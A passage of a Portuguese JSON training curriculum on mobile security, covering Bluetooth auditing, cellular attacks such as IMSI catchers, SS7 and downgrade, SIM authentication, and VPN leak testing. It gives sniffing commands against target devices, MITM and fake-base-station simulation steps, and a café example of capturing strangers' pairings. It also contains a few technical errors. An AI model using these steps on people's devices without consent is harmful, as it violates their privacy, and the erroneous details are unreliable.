                                  "learningObjective": "Preparar um ambiente seguro e funcional para auditoria Bluetooth.",
                                  "commonMistakes": [
                                    "Ignorar dependências de kernel para Ubertooth",
                                    "Não ativar Bluetooth no host",
                                    "Usar hardware incompatível sem drivers"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Descoberta de Dispositivos com hcitool",
                                  "subSteps": [
                                    "Ative o adaptador Bluetooth: 'hciconfig hci0 up'.",
                                    "Escaneie dispositivos clássicos: 'hcitool scan'.",
                                    "Escaneie dispositivos BLE: 'hcitool lescan --duplicates'.",
                                    "Registre MAC addresses, nomes e classes de dispositivos detectados.",
                                    "Salve saída em arquivo: 'hcitool scan > bluetooth_scan.txt'."
                                  ],
                                  "verification": "Lista de pelo menos 5 dispositivos detectados com MAC e nomes visíveis no log.",
                                  "estimatedTime": "20 minutos",
                                  "materials": [
                                    "Adaptador Bluetooth",
                                    "Ambiente com dispositivos Bluetooth próximos"
                                  ],
                                  "tips": [
                                    "Aumente potência com 'hciconfig hci0 piscan'; escaneie em horários de pico para mais tráfego."
                                  ],
                                  "learningObjective": "Identificar e catalogar dispositivos Bluetooth visíveis no ambiente.",
                                  "commonMistakes": [
                                    "Executar scan sem up no hci0",
                                    "Confundir BLE com clássico",
                                    "Não registrar timestamps"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Monitorar Pareamentos com BlueHydra",
                                  "subSteps": [
                                    "Inicie BlueHydra: 'sudo bluehydra -i hci0'.",
                                    "Monitore sessões de pareamento em tempo real via interface web (localhost:3000).",
                                    "Identifique tentativas de pareamento, incluindo chaves e autenticações fracas.",
                                    "Filtre por MAC suspeitos do scan anterior.",
                                    "Exporte dados para JSON ou CSV para análise posterior."
                                  ],
                                  "verification": "Interface web mostra mapa de dispositivos e eventos de pareamento em tempo real.",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "BlueHydra instalado",
                                    "Navegador web"
                                  ],
                                  "tips": [
                                    "Execute em background com screen/tmux; configure alertas para pareamentos não PIN."
                                  ],
                                  "learningObjective": "Detectar e registrar atividades de pareamento Bluetooth em ambientes dinâmicos.",
                                  "commonMistakes": [
                                    "Não especificar interface hci0",
                                    "Ignorar falsos positivos de ruído",
                                    "Fechar sessão prematuramente"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Sniffing e Teste de Segurança com Ubertooth",
                                  "subSteps": [
                                    "Configure Ubertooth: 'ubertooth-dongle -v' para verificar firmware.",
                                    "Inicie sniff clássico: 'ubertooth-btle -f -t <target_MAC>'.",
                                    "Capture pacotes de pareamento: 'ubertooth-rx -d ubertooth.pcap'.",
                                    "Analise pacotes com Wireshark para chaves fracas ou replay attacks.",
                                    "Teste MITM com ferramentas auxiliares como btproxy se aplicável."
                                  ],
                                  "verification": "Arquivo PCAP gerado com pacotes capturados e analisados no Wireshark.",
                                  "estimatedTime": "45 minutos",
                                  "materials": [
                                    "Ubertooth One",
                                    "Wireshark instalado"
                                  ],
                                  "tips": [
                                    "Sincronize clocks para captura precisa; use filtros BPF no Wireshark para Bluetooth."
                                  ],
                                  "learningObjective": "Capturar e analisar tráfego Bluetooth para vulnerabilidades de segurança.",
                                  "commonMistakes": [
                                    "Firmware desatualizado",
                                    "Não sincronizar com canal certo",
                                    "Análise sem contexto de scan anterior"
                                  ]
                                },
                                {
                                  "stepNumber": 5,
                                  "title": "Analisar Resultados e Gerar Relatório",
                                  "subSteps": [
                                    "Correlacione dados de hcitool, BlueHydra e Ubertooth.",
                                    "Identifique riscos: pareamentos abertos, chaves fracas, dispositivos legacy.",
                                    "Recomende mitigações: PIN forte, hiding mode, atualizações.",
                                    "Crie relatório com screenshots, logs e métricas (ex: 10 dispositivos, 3 vulneráveis).",
                                    "Valide com teste de repetição em ambiente controlado."
                                  ],
                                  "verification": "Relatório completo gerado e revisado, com evidências de vulnerabilidades.",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "Editor de texto",
                                    "Ferramentas de screenshot"
                                  ],
                                  "tips": [
                                    "Use templates Markdown para relatórios; priorize riscos altos."
                                  ],
                                  "learningObjective": "Sintetizar achados em insights acionáveis de segurança.",
                                  "commonMistakes": [
                                    "Relatório sem evidências",
                                    "Ignorar contexto legal/ético",
                                    "Não quantificar riscos"
                                  ]
                                }
                              ],
                              "practicalExample": "Em uma cafeteria lotada, use hcitool para listar smartphones pareando fones; BlueHydra detecta tentativas sem PIN; Ubertooth captura pacotes revelando chaves fracas em um dispositivo IoT, permitindo recomendação de bloqueio.",
                              "finalVerifications": [
                                "Todos dispositivos detectados listados com MAC, tipo e status de pareamento.",
                                "Logs de BlueHydra e PCAPs do Ubertooth exportados e analisados.",
                                "Pelo menos 2 vulnerabilidades identificadas com evidências.",
                                "Relatório gerado com mitigações propostas.",
                                "Teste de repetição confirma consistência dos achados.",
                                "Ambiente limpo: sem artefatos de sniff persistentes."
                              ],
                              "assessmentCriteria": [
                                "Precisão na detecção (zero falsos negativos em pareamentos visíveis).",
                                "Profundidade da análise de pacotes (identificação correta de protocolos).",
                                "Qualidade do relatório (claro, evidenciado, acionável).",
                                "Eficiência temporal (dentro de 3 horas totais).",
                                "Conhecimento de limitações éticas/legais demonstrado.",
                                "Integração correta de múltiplas ferramentas."
                              ],
                              "crossCurricularConnections": [
                                "Redes de Computadores: Protocolos Bluetooth Classic vs. LE.",
                                "Análise de Protocolos: Uso de Wireshark para dissecação de pacotes.",
                                "Hardware e Embedded Systems: Configuração de sniffers dedicados.",
                                "Ética e Direito: Conformidade com leis de privacidade em auditorias.",
                                "Programação: Scripts para automação de scans e parsing de logs."
                              ],
                              "realWorldApplication": "Em auditorias de segurança para empresas com frotas móveis, identificar dispositivos Bluetooth vulneráveis em conferências ou escritórios, prevenindo ataques como BlueBorne ou espionagem via pareamento forçado."
                            },
                            "estimatedTime": "2 horas",
                            "difficulty": "advanced",
                            "status": "not_started",
                            "prerequisites": []
                          }
                        ]
                      },
                      {
                        "id": "10.1.7.4.3",
                        "name": "Segurança em Redes Celulares Móveis",
                        "description": "Medidas contra ameaças em redes 4G/5G, como IMSI catchers, ataques SS7 e falhas de autenticação em operadoras móveis.",
                        "specificSkills": [
                          {
                            "id": "10.1.7.4.3.1",
                            "name": "Reconhecer ataques em redes celulares",
                            "description": "Explicar IMSI catchers (Stingrays), vulnerabilidades SS7/SIGTRAN e downgrade para 2G/3G em dispositivos móveis.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Compreender IMSI Catchers (Stingrays)",
                                  "subSteps": [
                                    "Pesquise a definição e funcionamento básico de um IMSI catcher: dispositivo que se passa por uma torre celular legítima para capturar IMSI (International Mobile Subscriber Identity).",
                                    "Estude como ele força dispositivos a se conectarem via força de sinal mais forte, permitindo interceptação de chamadas, SMS e dados.",
                                    "Analise componentes técnicos: uso de protocolos como A5/0 para criptografia fraca e captura de localização.",
                                    "Revise casos reais, como uso por agências de lei ou criminosos para vigilância.",
                                    "Identifique sinais de alerta: perda súbita de sinal, conexões instáveis ou apps de detecção como SnoopSnitch."
                                  ],
                                  "verification": "Explique em suas palavras como um IMSI catcher opera e liste 3 sinais de detecção.",
                                  "estimatedTime": "45 minutos",
                                  "materials": [
                                    "Artigo EFF sobre Stingrays (eff.org), vídeo YouTube 'IMSI Catcher Explained', app Android SnoopSnitch para simulação"
                                  ],
                                  "tips": "Use diagramas para visualizar a impostura da torre falsa.",
                                  "learningObjective": "Identificar o mecanismo e impactos de IMSI catchers em redes celulares.",
                                  "commonMistakes": "Confundir com jamming de sinal; IMSI catchers fingem ser legítimos, não bloqueiam."
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Explorar Vulnerabilidades SS7/SIGTRAN",
                                  "subSteps": [
                                    "Aprenda o que é SS7 (Signaling System No. 7): protocolo legada para sinalização em redes de telefonia.",
                                    "Estude SIGTRAN: extensão SS7 sobre IP, ainda vulnerável a acessos não autorizados.",
                                    "Identifique exploits comuns: rastreamento de localização, interceptação de SMS/ chamadas via mensagens SS7 maliciosas.",
                                    "Simule com ferramentas como SigPloit ou tutoriais em Wireshark para capturar tráfego SS7.",
                                    "Discuta mitigações: firewalls SS7 e Diameter Signaling Controller (DSC)."
                                  ],
                                  "verification": "Descreva um ataque SS7 passo a passo e sugira uma defesa básica.",
                                  "estimatedTime": "60 minutos",
                                  "materials": [
                                    "Documentação 3GPP SS7, tutorial Wireshark SS7 (wireshark.org), SigPloit GitHub repo"
                                  ],
                                  "tips": "Foquem em diferenças SS7 vs. SIGTRAN: SS7 é TDM, SIGTRAN é IP-based.",
                                  "learningObjective": "Reconhecer como protocolos SS7/SIGTRAN permitem ataques remotos em redes móveis.",
                                  "commonMistakes": "Achar que 5G elimina SS7; interop com redes legadas persiste."
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Analisar Ataques de Downgrade para 2G/3G",
                                  "subSteps": [
                                    "Entenda downgrade attacks: atacante força dispositivo de 4G/5G para 2G/3G com criptografia fraca (A5/1 ou nenhuma).",
                                    "Estude mecanismos: jamming seletivo de bandas 4G ou falsos beacons 2G.",
                                    "Aprenda detecção: monitorar handovers frequentes ou uso de apps como Android IMSI-Catcher Detector.",
                                    "Revise impactos: exposição a eavesdropping, MitM e falsificação de localização.",
                                    "Pratique identificando em cenários: perda de VoLTE indica possível downgrade."
                                  ],
                                  "verification": "Liste passos de um downgrade attack e 2 métodos de detecção em dispositivos reais.",
                                  "estimatedTime": "50 minutos",
                                  "materials": [
                                    "Relatório GSMA sobre downgrade attacks, app AIMSICD (Android), vídeo '2G Downgrade Attack' no YouTube"
                                  ],
                                  "tips": "Teste em modo avião + rede manual para simular handovers.",
                                  "learningObjective": "Detectar e explicar ataques que revertem protocolos modernos para legados vulneráveis.",
                                  "commonMistakes": "Ignorar que iOS/Android suportam detecção parcial; desative 'Permitir 2G' nas configs."
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Integrar Reconhecimento e Detecção Prática",
                                  "subSteps": [
                                    "Combine conhecimentos: crie fluxograma para identificar IMSI catcher vs. SS7 vs. downgrade.",
                                    "Instale e teste ferramentas de detecção móvel em emulador ou dispositivo real.",
                                    "Simule cenários: use SDR (Software Defined Radio) básico como HackRF para demo ética.",
                                    "Desenvolva checklist pessoal para monitoramento diário de rede celular.",
                                    "Avalie riscos em contextos reais: eventos públicos, áreas urbanas densas."
                                  ],
                                  "verification": "Crie e apresente um fluxograma de reconhecimento de ataques celulares.",
                                  "estimatedTime": "75 minutos",
                                  "materials": [
                                    "HackRF One docs (greatscottgadgets.com), SnoopSnitch APK, fluxograma tool como Draw.io"
                                  ],
                                  "tips": "Registre logs de rede com apps para análise posterior.",
                                  "learningObjective": "Aplicar conhecimentos para reconhecer ataques em tempo real.",
                                  "commonMistakes": "Confiar só em apps; valide com múltiplas fontes e comportamentos anômalos."
                                }
                              ],
                              "practicalExample": "Em uma manifestação pública, um IMSI catcher disfarçado de torre 4G força celulares próximos a downgradear para 2G, permitindo que atacantes capturem SMS de autenticação bancária via SS7; detecção via app mostrando handover anormal e sinal fraco persistente.",
                              "finalVerifications": [
                                "Explicar funcionamento de IMSI catcher com diagrama.",
                                "Listar 3 vulnerabilidades SS7 e uma mitigação.",
                                "Descrever passos de um downgrade attack 4G-to-2G.",
                                "Identificar 4 sinais comuns de ataques celulares em um log de rede.",
                                "Criar checklist pessoal de detecção.",
                                "Simular detecção com app em dispositivo móvel."
                              ],
                              "assessmentCriteria": [
                                "Precisão técnica na explicação de cada ataque (80%+ correto).",
                                "Capacidade de diferenciar IMSI catcher, SS7 e downgrade.",
                                "Uso correto de terminologia (IMSI, SS7, SIGTRAN, A5/1).",
                                "Demonstração prática com ferramentas ou simulações.",
                                "Identificação de mitigações realistas.",
                                "Fluxograma lógico e completo de reconhecimento."
                              ],
                              "crossCurricularConnections": [
                                "Redes de Computadores: Protocolos de sinalização e handovers.",
                                "Criptografia: Análise de algoritmos A5/x e fraquezas.",
                                "Direito e Ética: Implicações legais de vigilância (ex: warrants para Stingrays).",
                                "Engenharia de Software: Desenvolvimento de apps de detecção móvel."
                              ],
                              "realWorldApplication": "Profissionais de TI usam esse conhecimento para configurar alertas em frotas de dispositivos móveis corporativos, detectando vigilância estatal ou corporativa em áreas sensíveis, protegendo dados confidenciais de executivos em viagens."
                            },
                            "estimatedTime": "1 hora",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.7.4.3.2",
                            "name": "Configurar proteções em SIM e eSIM",
                            "description": "Implementar autenticação AKA (Authentication and Key Agreement) e detectar fake base stations usando apps como SnoopSnitch.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Compreender Fundamentos de SIM, eSIM e Autenticação AKA",
                                  "subSteps": [
                                    "Estude a arquitetura de SIM cards físicos e eSIMs provisionados remotamente.",
                                    "Aprenda o protocolo AKA: geração de chaves (Ki, RAND), autenticação mútua e cálculo de SRES e Kc.",
                                    "Identifique vulnerabilidades comuns em SIM/eSIM, como clonagem e ataques de IMSI catcher.",
                                    "Revise diferenças entre 2G/3G (COMP128) e 4G/5G (Milne/AES-based AKA).",
                                    "Documente um diagrama de fluxo do processo AKA."
                                  ],
                                  "verification": "Crie um diagrama de fluxo AKA correto e explique verbalmente ou por escrito.",
                                  "estimatedTime": "2 horas",
                                  "materials": "Documentação 3GPP TS 33.102, vídeos tutoriais sobre AKA, papel/diagrama digital (Draw.io).",
                                  "tips": "Use analogias como 'chave de casa' para Ki e 'desafio-resposta' para RAND/SRES.",
                                  "learningObjective": "Entender os mecanismos criptográficos subjacentes à autenticação em redes celulares.",
                                  "commonMistakes": "Confundir autenticação unilateral (rede para UE) com mútua; ignorar evolução para 5G-AKA."
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Configurar e Testar Autenticação AKA em Ambiente Simulado",
                                  "subSteps": [
                                    "Instale ferramentas de simulação como Open5GS ou srsRAN para emular rede celular.",
                                    "Provisione um SIM/eSIM virtual usando pySIM ou similar para gerar Ki e OPC.",
                                    "Configure parâmetros AKA no UE simulado e envie AUTN/RAND para autenticação.",
                                    "Verifique geração correta de RES, AUTN e integridade usando Wireshark para capturar tráfego.",
                                    "Teste falhas intencionais (chave errada) para validar rejeição."
                                  ],
                                  "verification": "Registre logs bem-sucedidos e falhos de autenticação AKA com chaves matching/non-matching.",
                                  "estimatedTime": "3 horas",
                                  "materials": "Open5GS/srsRAN, pySIM, Wireshark, VM com Ubuntu, cartões SIM programáveis (opcional).",
                                  "tips": "Comece com 3G-AKA para simplicidade antes de 5G; use scripts automatizados para testes repetidos.",
                                  "learningObjective": "Implementar e validar o protocolo AKA em um ambiente controlado.",
                                  "commonMistakes": "Erros de codificação hexadecimal em Ki/OPC; não sincronizar sequências SQN."
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Instalar e Configurar App SnoopSnitch para Detecção de Fake Base Stations",
                                  "subSteps": [
                                    "Root e instale SnoopSnitch em dispositivo Android compatível (Qualcomm chipset).",
                                    "Ative permissões de diagnóstico de rádio e configure monitoramento de IMSI/Location Area.",
                                    "Calibre o app em rede legítima para baseline de sinal (TA, RSSI, CIDs).",
                                    "Aprenda alertas: IMSI paging, silent SMS, base stations suspeitas (TDD/LTE misturado).",
                                    "Integre com OsmocomBB ou RTL-SDR para captura avançada de sinal RF."
                                  ],
                                  "verification": "Capture baseline de rede real e gere alerta simulado com jammer RF simples.",
                                  "estimatedTime": "2 horas",
                                  "materials": "Android rooted (ex: Nexus 5), SnoopSnitch APK, RTL-SDR (opcional), guia de root XDA.",
                                  "tips": "Teste em modo avião primeiro; evite áreas urbanas densas para baseline limpa.",
                                  "learningObjective": "Configurar ferramenta prática para monitoramento de segurança celular.",
                                  "commonMistakes": "Ignorar requisitos de chipset (apenas Qualcomm); não rootar corretamente levando a crashes."
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Integrar Proteções e Realizar Testes de Detecção de Ameaças",
                                  "subSteps": [
                                    "Combine AKA simulado com SnoopSnitch: detecte downgrade attacks (2G fallback).",
                                    "Simule fake BS usando gr-gsm ou bladeRF para enviar IMSI catchers falsos.",
                                    "Configure proteções: desative 2G, force LTE/5G, use VPN para tráfego pós-autenticação.",
                                    "Analise logs SnoopSnitch para métricas de detecção (falsos positivos/negativos).",
                                    "Crie relatório de mitigação com passos de resposta a alertas."
                                  ],
                                  "verification": "Demonstre detecção e bloqueio de fake BS em simulação, com logs e vídeo screencast.",
                                  "estimatedTime": "3 horas",
                                  "materials": "SnoopSnitch ativo, simulador fake BS (gr-gsm), dispositivo móvel real.",
                                  "tips": "Use Faraday cage para testes indoor seguros; grave tudo para portfólio.",
                                  "learningObjective": "Aplicar conhecimentos em detecção e resposta a ataques em redes móveis.",
                                  "commonMistakes": "Não calibrar thresholds de alerta; confundir ruído legítimo com ataques."
                                }
                              ],
                              "practicalExample": "Em um teste de penetração móvel, configure um eSIM em smartphone Android com AKA validado via Open5GS. Use SnoopSnitch para detectar um fake LTE BS simulado com gr-gsm emitindo IMSI pages falsos, bloqueando conexão e alertando via SMS seguro.",
                              "finalVerifications": [
                                "Diagrama AKA completo e preciso.",
                                "Logs de autenticação AKA bem-sucedida e falha.",
                                "Capturas SnoopSnitch mostrando baseline e alerta de fake BS.",
                                "Relatório de teste com análise de falsos positivos.",
                                "Configuração de proteções (desative 2G) persistente no dispositivo.",
                                "Vídeo demo de detecção em tempo real."
                              ],
                              "assessmentCriteria": [
                                "Precisão técnica no entendimento e implementação de AKA (90%+ correção).",
                                "Eficácia da detecção com SnoopSnitch (alarmes acionados corretamente em 100% dos testes).",
                                "Qualidade dos substeps e documentação (clareza, completude).",
                                "Gestão de tempo e recursos (dentro dos estimados).",
                                "Criatividade em simulações e mitigação de erros comuns.",
                                "Relatório final abrangente com evidências visuais."
                              ],
                              "crossCurricularConnections": [
                                "Criptografia: Protocolos de autenticação e chaves simétricas (AES).",
                                "Redes: Protocolos 3GPP (NAS, RRC) e análise de pacotes (Wireshark).",
                                "Hardware/Software: Programação de SIM (pySIM) e SDR (RTL-SDR).",
                                "Ética em Cibersegurança: Legalidade de testes RF e privacidade IMSI.",
                                "Desenvolvimento Móvel: Rooting Android e apps de diagnóstico."
                              ],
                              "realWorldApplication": "Profissionais de segurança móvel usam essas proteções em cenários como jornalistas em zonas de conflito detectando IMSI catchers governamentais, ou empresas configurando eSIMs corporativos resistentes a ataques de downgrade em redes públicas."
                            },
                            "estimatedTime": "1.5 horas",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          }
                        ]
                      },
                      {
                        "id": "10.1.7.4.4",
                        "name": "Implementação de VPNs Móveis",
                        "description": "Uso de Redes Privadas Virtuais para cifrar tráfego em redes não confiáveis, incluindo protocolos adequados para mobilidade.",
                        "specificSkills": [
                          {
                            "id": "10.1.7.4.4.1",
                            "name": "Selecionar e configurar protocolos VPN móveis",
                            "description": "Comparar e configurar IKEv2/IPsec, OpenVPN e WireGuard em apps móveis (ex: Android OpenVPN, iOS built-in), priorizando mobilidade e reconexão automática.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Pesquisar e Comparar Protocolos VPN Móveis",
                                  "subSteps": [
                                    "Identifique os protocolos principais: IKEv2/IPsec, OpenVPN e WireGuard.",
                                    "Analise características chave: velocidade, segurança, suporte a mobilidade e reconexão automática.",
                                    "Compare IKEv2/IPsec (rápido em reconexões, nativo iOS), OpenVPN (versátil, apps dedicados) e WireGuard (leve, moderno, excelente mobilidade).",
                                    "Crie uma tabela de comparação considerando bateria, latência e compatibilidade móvel.",
                                    "Priorize mobilidade: avalie Dead Peer Detection (IKEv2), keepalive (OpenVPN) e roaming (WireGuard)."
                                  ],
                                  "verification": "Tabela de comparação completa com pelo menos 5 critérios por protocolo, destacando vencedor para mobilidade.",
                                  "estimatedTime": "45 minutos",
                                  "materials": [
                                    "Documentação oficial: site WireGuard, OpenVPN.org, Apple Developer VPN docs",
                                    "Planilha Google Sheets ou papel para tabela"
                                  ],
                                  "tips": "Use benchmarks reais de sites como VPNMentor para dados objetivos; foque em cenários móveis como Wi-Fi para 4G.",
                                  "learningObjective": "Compreender diferenças técnicas e trade-offs para seleção informada.",
                                  "commonMistakes": [
                                    "Ignorar impacto na bateria",
                                    "Confundir protocolo com app",
                                    "Não considerar suporte nativo do SO"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Selecionar Protocolo Adequado para Cenário Móvel",
                                  "subSteps": [
                                    "Defina requisitos: alta mobilidade, reconexão <5s, baixa latência, criptografia forte.",
                                    "Avalie cenários: corporativo (IKEv2), open-source (WireGuard), legado (OpenVPN).",
                                    "Pontue protocolos: +2 para reconexão automática, +1 para velocidade móvel, -1 por complexidade config.",
                                    "Escolha baseado em SO: WireGuard para ambos, IKEv2 para iOS prioritário.",
                                    "Documente justificativa com pelo menos 3 razões priorizando mobilidade."
                                  ],
                                  "verification": "Relatório de seleção com protocolo escolhido e justificativa escrita.",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "Tabela do Step 1",
                                    "Ferramentas de pontuação simples como Excel"
                                  ],
                                  "tips": "Teste preferência com demos online; priorize WireGuard para 2023+ por eficiência.",
                                  "learningObjective": "Aplicar critérios de decisão para otimizar VPN móvel.",
                                  "commonMistakes": [
                                    "Selecionar por popularidade sem análise",
                                    "Ignorar restrições de rede móvel",
                                    "Não considerar dual-stack IPv4/IPv6"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Configurar Protocolo Selecionado em Android",
                                  "subSteps": [
                                    "Instale app: OpenVPN for Android ou WireGuard oficial da Play Store.",
                                    "Obtenha arquivo de config (.ovpn ou .conf) de servidor VPN teste (ex: VPS com PiVPN).",
                                    "Importe config: permita permissões VPN, defina split-tunnel se necessário.",
                                    "Ative reconexão automática: em WireGuard marque 'On-Demand', em OpenVPN ative keepalive.",
                                    "Teste inicial: conecte em Wi-Fi, troque para dados móveis sem desconexão."
                                  ],
                                  "verification": "VPN conecta e mantém sessão durante switch de rede por 2 minutos.",
                                  "estimatedTime": "1 hora",
                                  "materials": [
                                    "Smartphone Android 10+, App OpenVPN/WireGuard",
                                    "Servidor VPN teste (ex: DigitalOcean droplet com WireGuard)"
                                  ],
                                  "tips": "Use QR code para import rápido; desative battery optimization para app VPN.",
                                  "learningObjective": "Executar configuração prática com foco em mobilidade Android.",
                                  "commonMistakes": [
                                    "Esquecer permissões de overlay",
                                    "Config kill-switch desnecessário",
                                    "Usar config UDP sem fallback TCP"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Configurar Protocolo em iOS e Testes Cross-Plataforma",
                                  "subSteps": [
                                    "Para iOS: use IKEv2/IPsec nativo ou WireGuard app; adicione perfil via .mobileconfig ou QR.",
                                    "Configure On-Demand: em Ajustes > VPN > Conectar sob demanda > Wi-Fi/Dados Celulares.",
                                    "Sincronize configs Android/iOS para mesmo servidor.",
                                    "Teste mobilidade: ande com device, perca sinal Wi-Fi, verifique reconexão <10s.",
                                    "Monitore logs: use app logs para debug reconexões falhas."
                                  ],
                                  "verification": "Reconexão automática em ambos OS durante simulação de handover de rede.",
                                  "estimatedTime": "45 minutos",
                                  "materials": [
                                    "iPhone iOS 14+, WireGuard app App Store",
                                    "Mesmo servidor VPN do Step 3"
                                  ],
                                  "tips": "Gere configs com ferramentas como Streisand ou Outline para compatibilidade cross-OS.",
                                  "learningObjective": "Garantir configuração consistente e robusta em ecossistemas móveis.",
                                  "commonMistakes": [
                                    "Não ativar On-Demand no iOS",
                                    "Ignorar certificados auto-assinados",
                                    "Testar só em Wi-Fi estável"
                                  ]
                                },
                                {
                                  "stepNumber": 5,
                                  "title": "Otimizar e Validar Configuração Final",
                                  "subSteps": [
                                    "Meça performance: velocidade, latência, drain de bateria com Speedtest app.",
                                    "Ajuste params: MTU 1280 para mobile, cipher prefer AES-GCM.",
                                    "Teste cenários edge: low signal, airplane mode toggle, app background.",
                                    "Backup configs e documente passos para replicação.",
                                    "Compartilhe config segura via QR ou encrypted file."
                                  ],
                                  "verification": "Relatório de testes com métricas: reconexão <5s, perda de pacotes <1%.",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "Apps: Speedtest, Wireshark mobile ou tcpdump",
                                    "Bateria monitor app"
                                  ],
                                  "tips": "Use 'ping -i 0.2 google.com' durante testes para monitorar drops.",
                                  "learningObjective": "Refinar configuração para produção móvel.",
                                  "commonMistakes": [
                                    "Não testar bateria em uso prolongado",
                                    "Overlook IPv6 leaks",
                                    "Assumir OK sem métricas quantitativas"
                                  ]
                                }
                              ],
                              "practicalExample": "Configure WireGuard em Android e iOS para um jornalista freelance acessar rede corporativa segura enquanto viaja de trem (Wi-Fi -> 4G switches), garantindo reconexão automática sem perda de sessão de edição de vídeo remota.",
                              "finalVerifications": [
                                "VPN reconecta em <5s após perda de Wi-Fi em ambos OS.",
                                "Sem vazamento IP durante handover (verifique whatismyipaddress.com).",
                                "Latência <100ms e throughput >20Mbps em mobile data.",
                                "Bateria drain <5% extra/hora vs sem VPN.",
                                "Logs mostram zero falhas de autenticação em 10 ciclos.",
                                "Config funciona em background e após reboot."
                              ],
                              "assessmentCriteria": [
                                "Precisão na comparação: tabela cobre 5+ critérios com fontes.",
                                "Seleção justificada: 3+ razões alinhadas a mobilidade.",
                                "Configuração sem erros: VPN ativa e reconecta em testes.",
                                "Otimização evidenciada: métricas melhoradas pós-ajustes.",
                                "Documentação completa: passos replicáveis.",
                                "Testes abrangentes: 3+ cenários mobile validados."
                              ],
                              "crossCurricularConnections": [
                                "Redes: Entendimento de IPSec tunnels e UDP encapsulation.",
                                "Criptografia: AES-GCM, chaves efêmeras em WireGuard.",
                                "Desenvolvimento Mobile: Integração VPN APIs Android/iOS.",
                                "Segurança: Mitigação MITM em redes públicas.",
                                "Administração de Sistemas: Gerenciamento de servidores VPN."
                              ],
                              "realWorldApplication": "Profissionais remotos configuram VPN móvel para acesso seguro a dados corporativos em trânsito, evitando censura em viagens internacionais ou protegendo contra Wi-Fi públicos em aeroportos e cafés."
                            },
                            "estimatedTime": "2 horas",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.7.4.4.2",
                            "name": "Avaliar eficácia de VPN contra ameaças",
                            "description": "Testar VPNs contra leaks de DNS/IPv6, kill switches e proteção em Wi-Fi público/celular usando ferramentas como ipleak.net.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Preparar o ambiente de teste",
                                  "subSteps": [
                                    "Selecione uma VPN confiável (ex: ExpressVPN, NordVPN) e instale o cliente no dispositivo de teste (PC ou mobile).",
                                    "Escolha ferramentas de teste: ipleak.net, dnsleaktest.com, whatismyipaddress.com.",
                                    "Configure o dispositivo para redes de teste: Wi-Fi público simulado, dados móveis e rede doméstica.",
                                    "Desative IPv6 temporariamente se necessário e anote configurações iniciais do IP real.",
                                    "Crie um checklist de testes para registrar resultados."
                                  ],
                                  "verification": "Ambiente pronto quando VPN instalada, ferramentas acessíveis e checklist criado.",
                                  "estimatedTime": "20 minutos",
                                  "materials": [
                                    "Cliente VPN",
                                    "Navegador web",
                                    "Dispositivo móvel/PC",
                                    "Acesso a Wi-Fi público ou hotspot simulado"
                                  ],
                                  "tips": "Use um dispositivo limpo ou VM para isolar testes e evitar interferências de extensões de navegador.",
                                  "learningObjective": "Configurar corretamente o setup para testes isolados e reprodutíveis de VPN.",
                                  "commonMistakes": "Esquecer de anotar IP real inicial ou não desabilitar proxies/extensões que mascaram IP."
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Testar leaks de IP e DNS",
                                  "subSteps": [
                                    "Conecte à VPN e acesse ipleak.net sem navegar em outros sites.",
                                    "Verifique se o IP exibido é o do servidor VPN, não o real.",
                                    "Execute teste de DNS leak em dnsleaktest.com e confirme que servidores DNS são da VPN.",
                                    "Repita sem VPN para comparar resultados.",
                                    "Registre screenshots de antes/depois."
                                  ],
                                  "verification": "Nenhum IP/DNS real vazando; todos apontam para VPN.",
                                  "estimatedTime": "15 minutos",
                                  "materials": [
                                    "ipleak.net",
                                    "dnsleaktest.com",
                                    "Screenshots tool"
                                  ],
                                  "tips": "Limpe cache do navegador e use modo incógnito para resultados precisos.",
                                  "learningObjective": "Identificar e validar proteção contra vazamentos básicos de IP e DNS.",
                                  "commonMistakes": "Não limpar cache ou usar sites com trackers que interferem nos testes."
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Testar leaks de IPv6 e kill switch",
                                  "subSteps": [
                                    "Habilite IPv6 no dispositivo e conecte à VPN.",
                                    "Acesse test-ipv6.com ou ipleak.net para verificar leaks de IPv6.",
                                    "Teste kill switch: desconecte a internet (desative Wi-Fi) com VPN ativa e tente acessar sites.",
                                    "Confirme que kill switch bloqueia tráfego sem VPN.",
                                    "Reative internet e reconecte VPN, verificando continuidade."
                                  ],
                                  "verification": "Sem tráfego IPv6 vazando e kill switch bloqueando conexão sem VPN.",
                                  "estimatedTime": "25 minutos",
                                  "materials": [
                                    "test-ipv6.com",
                                    "Configurações de rede do SO"
                                  ],
                                  "tips": "Teste kill switch em modo seletivo e sempre ativo para cenários reais.",
                                  "learningObjective": "Avaliar proteções avançadas contra leaks de IPv6 e falhas de conexão.",
                                  "commonMistakes": "Ignorar IPv6 habilitado por padrão em muitos SOs ou não testar kill switch em desconexão real."
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Testar proteção em Wi-Fi público e dados móveis",
                                  "subSteps": [
                                    "Conecte a Wi-Fi público (café ou hotspot gratuito) sem VPN e anote riscos (IP exposto).",
